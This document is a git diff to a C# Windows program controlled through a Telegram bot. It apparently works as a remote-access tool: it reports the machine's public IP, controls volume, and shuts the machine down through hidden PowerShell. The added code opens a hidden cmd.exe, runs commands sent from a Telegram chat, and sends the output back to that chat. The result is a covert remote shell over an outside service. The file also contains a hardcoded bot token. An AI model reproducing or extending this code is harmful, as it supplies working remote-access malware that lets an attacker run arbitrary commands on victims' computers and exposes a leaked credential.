@@ -1,17 +1,18 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using Telegram.Bot;
 using Telegram.Bot.Args;
 using Telegram.Bot.Types.Enums;
-using System.Net;
-using System.Text.RegularExpressions;
 using Telegram.Bot.Types.ReplyMarkups;
-using System.Threading.Tasks;
-using System.Threading;
 
 namespace Rory_Mercury
 {
@@ -19,10 +20,12 @@ namespace Rory_Mercury
     {
         protected static readonly TelegramBotClient Bot = new TelegramBotClient("956177251:AAE65NwO-j2Rf8H_J70FiSew4gaCgOT0yyc");
         protected static Telegram.Bot.Types.Message message;
+        private static Process process = new Process();
         private static DateTime StartSession;
         private static string UserMessage;
         private static string globalPath;
         private static bool musicFlag = false;
+        private static bool cmdFlag = false;
         private static bool backgroundFlag = false;
         private static MatchCollection globalIp;
         private readonly string path = "states.txt";
@@ -48,7 +51,7 @@ namespace Rory_Mercury
         public Main()
         {
             InitializeComponent();
-            
+
             WebClient webClient = new WebClient();
             Stream data = webClient.OpenRead("https://2ip.ru/");
             StreamReader reader = new StreamReader(data);
@@ -135,7 +138,44 @@ namespace Rory_Mercury
 
                 startMenu("start");
             }
+            if (message.Text == "/exit")
+            {
+                cmdFlag = false;
+                startMenu("main");
+            }
+            if (cmdFlag)
+            {
+                string command = message.Text;
 
+                process.StandardInput.WriteLine(command);
+                process.StandardInput.Flush();
+
+                process.StandardInput.WriteLine("cls");
+                process.StandardInput.Flush();
+            }
+            if (message.Text == "/cmd")
+            {
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.WorkingDirectory = @"C:\";
+                process.StartInfo.FileName = Path.Combine(Environment.SystemDirectory, "cmd.exe");
+
+
+                process.StartInfo.RedirectStandardInput = true;
+
+                process.OutputDataReceived += ProcessOutputDataHandler;
+                process.ErrorDataReceived += ProcessErrorDataHandler;
+
+                process.Start();
+
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+
+                cmdFlag = true;
+                return;
+            }
         }
 
         [DllImport("user32.dll")]
@@ -168,10 +208,10 @@ namespace Rory_Mercury
                 changeVolume(APPCOMMAND_VOLUME_MUTE);
 
             else if (callbackQuery.Data == "Добавить")
-                changeVolume(APPCOMMAND_VOLUME_UP);              
+                changeVolume(APPCOMMAND_VOLUME_UP);
 
             else if (callbackQuery.Data == "Убавить")
-                changeVolume(APPCOMMAND_VOLUME_DOWN);             
+                changeVolume(APPCOMMAND_VOLUME_DOWN);
 
             else if (callbackQuery.Data == "Выкл.")
                 stateMachine("-s");
@@ -308,11 +348,26 @@ namespace Rory_Mercury
 
         }
 
+        public static void ProcessOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            if (outLine.Data != null)
+            {
+                Bot.SendTextMessageAsync(ChatId, outLine.Data);
+                Thread.Sleep(500);
+            }                
+        }
+
+        public static void ProcessErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            if (outLine.Data != null)
+                Bot.SendTextMessageAsync(ChatId, outLine.Data);
+        }
+
         private static void stateMachine(string Act)
         {
-            System.Diagnostics.Process process = new System.Diagnostics.Process();
-            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
             startInfo.FileName = "powershell.exe";
             startInfo.Arguments = $"shutdown {Act} -t 00";
             process.StartInfo = startInfo;
